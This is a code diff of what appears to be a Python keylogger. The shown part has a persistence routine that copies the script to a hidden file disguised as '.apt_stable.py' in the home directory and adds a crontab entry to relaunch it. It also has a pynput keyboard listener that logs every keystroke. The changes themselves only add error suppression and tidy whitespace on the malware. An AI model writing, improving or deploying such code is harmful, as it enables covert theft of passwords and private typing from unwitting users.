@@ -41,7 +41,10 @@ def persist():
             pass
         # print(opt)
         if not __file__ in opt:
-            shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expanduser("~"), ".apt_stable.py"))
+            try:
+                shutil.copy(os.path.join(os.path.abspath("."),__file__), os.path.join(os.path.expanduser("~"), ".apt_stable.py"))
+            except:
+                pass
             cmd = "python3 " + os.path.join(os.path.expanduser("~"), ".apt_stable.py")
             subprocess.run(["bash","-c",f"(echo 5 \* \* \* \* {cmd}; echo {opt}) |  crontab "])
     else:
@@ -190,7 +193,7 @@ def log(key):
         else:
             current_key += " " + str(key) + " "
     LOG += current_key
-    
+
 def log_start():
     keyboard_listener = pynput.keyboard.Listener(on_press=log)
     with keyboard_listener:
